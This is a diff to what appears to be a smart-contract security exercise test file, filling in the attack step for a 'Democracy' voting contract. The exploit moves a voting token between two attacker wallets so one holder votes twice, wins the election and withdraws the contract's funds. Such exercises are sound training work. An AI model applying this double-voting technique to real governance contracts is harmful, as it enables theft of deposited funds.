@@ -10,24 +10,41 @@ const NAME = "Democracy";
 
 describe(NAME, function () {
   async function setup() {
-      const [owner, attackerWallet] = await ethers.getSigners();
+        const [owner, attackerWallet, attackerWallet2] = await ethers.getSigners();
       const value = ethers.utils.parseEther("1");
 
       const VictimFactory = await ethers.getContractFactory(NAME);
       const victimContract = await VictimFactory.deploy({ value });
 
-      return { victimContract, attackerWallet };
+        return { victimContract, attackerWallet, attackerWallet2 };
   }
 
   describe("exploit", async function () {
-      let victimContract, attackerWallet;
-      before(async function () {
-          ({ victimContract, attackerWallet } = await loadFixture(setup));
-      })
+        let victimContract, attackerWallet, attackerWallet2;
+        before(async function () {
+            ({ victimContract, attackerWallet, attackerWallet2 } = await loadFixture(setup));
+        });
 
-      it("conduct your attack here", async function () {
-          
-      });
+        it("conduct your attack here", async function () {
+            await victimContract.connect(attackerWallet).nominateChallenger(attackerWallet.address);
+
+            // transfer one token to attacker2
+            await victimContract
+                .connect(attackerWallet)
+                .transferFrom(attackerWallet.address, attackerWallet2.address, 0);
+
+            // attacker2 vote for attacker1
+            await victimContract.connect(attackerWallet2).vote(attackerWallet.address);
+            // attacker2 transfer the token back
+            await victimContract
+                .connect(attackerWallet2)
+                .transferFrom(attackerWallet2.address, attackerWallet.address, 0);
+
+            // at last attacker1 vote for himself and won the election
+            await victimContract.connect(attackerWallet).vote(attackerWallet.address);
+
+            await victimContract.connect(attackerWallet).withdrawToAddress(attackerWallet.address);
+        });
 
       after(async function () {
           const victimContractBalance = await ethers.provider.getBalance(victimContract.address);
